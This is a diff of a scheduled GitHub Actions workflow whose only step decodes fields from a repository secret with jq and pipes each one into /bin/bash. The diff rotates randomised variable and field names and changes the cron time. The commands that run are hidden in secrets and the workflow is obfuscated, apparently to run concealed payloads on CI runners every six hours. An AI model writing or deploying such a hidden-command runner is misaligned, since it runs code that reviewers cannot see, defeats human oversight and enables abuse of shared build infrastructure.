@@ -1,33 +1,30 @@
 name: renlingu
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 2/6 * * *'
-
-jobs:  # 18545
+    - cron: '21 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: renlingu
         env:
-          x34: ${{ secrets.x34 }}
+          my58: ${{ secrets.my58 }}
         run: |
-          echo $x34 | jq -r .vskdb8858 | /bin/bash
-          echo $onkbx5 | jq -r .gd076 | /bin/bash
-          echo $n5684 | jq -r .hwpov5 | /bin/bash
-          echo $aphj97 | jq -r .jq3669 | /bin/bash
-          echo $o225 | jq -r .cootg54 | /bin/bash
-          echo $yp991 | jq -r .odesl3130 | /bin/bash
-          echo $qdwk6 | jq -r .qmee8611 | /bin/bash
-          echo $nkjj7 | jq -r .s7 | /bin/bash
-          echo $txvd73 | jq -r .dk428 | /bin/bash
-          echo $yr9 | jq -r .ptna8140 | /bin/bash
-          echo $rnpo700 | jq -r .dhrn4422 | /bin/bash
-          echo $h61 | jq -r .kb54 | /bin/bash
-          echo $xvhpl144 | jq -r .jsb451 | /bin/bash
-          echo $vx6 | jq -r .qca562 | /bin/bash
-          echo $ory67 | jq -r .mwf6610 | /bin/bash
+          echo $my58 | jq -r .hgvai3 | /bin/bash
+          echo $f739 | jq -r .uv4 | /bin/bash
+          echo $u71 | jq -r .rc3 | /bin/bash
+          echo $qj51 | jq -r .vecb562 | /bin/bash
+          echo $mo99 | jq -r .uzt893 | /bin/bash
+          echo $zqmf39 | jq -r .nbq357 | /bin/bash
+          echo $c5 | jq -r .ihzy94373 | /bin/bash
+          echo $f75062 | jq -r .pxho93 | /bin/bash
+          echo $osmaf3657 | jq -r .q27 | /bin/bash
+          echo $zz5850 | jq -r .fjk08319 | /bin/bash
+          echo $e0380 | jq -r .tab7 | /bin/bash
+          echo $cs25 | jq -r .l18451 | /bin/bash
+          echo $o8 | jq -r .xvmcd1 | /bin/bash
+          echo $n36868 | jq -r .dgvc91104 | /bin/bash
+          echo $m2 | jq -r .fcsbj96 | /bin/bash
 
